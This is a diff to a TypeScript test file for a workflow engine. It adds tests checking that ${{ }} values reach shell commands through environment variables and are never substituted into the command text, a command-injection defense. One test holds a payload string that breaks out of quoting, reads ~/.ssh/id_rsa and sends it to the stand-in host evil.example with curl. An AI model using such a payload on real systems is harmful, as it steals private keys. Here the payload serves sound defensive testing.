@@ -106,6 +106,10 @@ describe('WorkflowEngine scheduling', () => {
   })
 
   it('resolves ${{ }} placeholders in step fields before invoking the executor', async () => {
+    // Command steps interpolate ${{ }} via env-var indirection, not text
+    // substitution (see the class doc comment / expressions.ts interpolateForShell)
+    // — a command-injection defense (finding CMD-INJ-1). The generated var
+    // references land in the command text; the actual values travel via env.
     const def: WorkflowDefinition = {
       name: 'interpolated',
       variables: { test_command: 'npm test' },
@@ -119,17 +123,74 @@ describe('WorkflowEngine scheduling', () => {
       ],
     }
     let receivedCommand: string | undefined
+    let receivedEnv: Readonly<Record<string, string>> | undefined
     const engine = new WorkflowEngine()
     await engine.execute(def, {
       executors: executors({
         analyze: ok({ suite: 'unit' }),
         run: async (workflowStep) => {
-          receivedCommand = workflowStep.kind === 'command' ? workflowStep.command : undefined
+          if (workflowStep.kind === 'command') {
+            receivedCommand = workflowStep.command
+            receivedEnv = workflowStep.env
+          }
           return { status: 'succeeded' }
         },
       }),
     })
-    expect(receivedCommand).toBe('npm test -- unit')
+    expect(receivedCommand).toBe('"$OVERTURE_VAR_0" -- "$OVERTURE_VAR_1"')
+    expect(receivedEnv).toEqual({ OVERTURE_VAR_0: 'npm test', OVERTURE_VAR_1: 'unit' })
+  })
+
+  it('does NOT interpolate command steps via direct text substitution — a malicious value never appears in the command string', async () => {
+    const payload = '"; curl evil.example/$(cat ~/.ssh/id_rsa); echo "'
+    const def: WorkflowDefinition = {
+      name: 'command-injection-defense',
+      variables: { work_title: payload },
+      steps: [step({ id: 'run', command: 'echo "${{ vars.work_title }}"' })],
+    }
+    let receivedCommand: string | undefined
+    let receivedEnv: Readonly<Record<string, string>> | undefined
+    const engine = new WorkflowEngine()
+    await engine.execute(def, {
+      executors: executors({
+        run: async (workflowStep) => {
+          if (workflowStep.kind === 'command') {
+            receivedCommand = workflowStep.command
+            receivedEnv = workflowStep.env
+          }
+          return { status: 'succeeded' }
+        },
+      }),
+    })
+    expect(receivedCommand).not.toContain(payload)
+    expect(receivedCommand).not.toContain('curl')
+    expect(receivedEnv?.OVERTURE_VAR_0).toBe(payload)
+  })
+
+  it('interpolates action `with` values and agent `goal` directly (they never hit a shell)', async () => {
+    const def: WorkflowDefinition = {
+      name: 'non-shell-interpolation',
+      variables: { title: 'a "quoted" & `tricky` value' },
+      steps: [
+        {
+          id: 'deliver',
+          kind: 'action',
+          action: 'source_control.pull_request',
+          with: { title: '${{ vars.title }}' },
+        },
+      ],
+    }
+    let receivedTitle: unknown
+    const engine = new WorkflowEngine()
+    await engine.execute(def, {
+      executors: executors({
+        deliver: async (workflowStep) => {
+          if (workflowStep.kind === 'action') receivedTitle = workflowStep.with?.title
+          return { status: 'succeeded' }
+        },
+      }),
+    })
+    expect(receivedTitle).toBe('a "quoted" & `tricky` value')
   })
 
   it('uses the supplied clock for step start/finish timestamps', async () => {
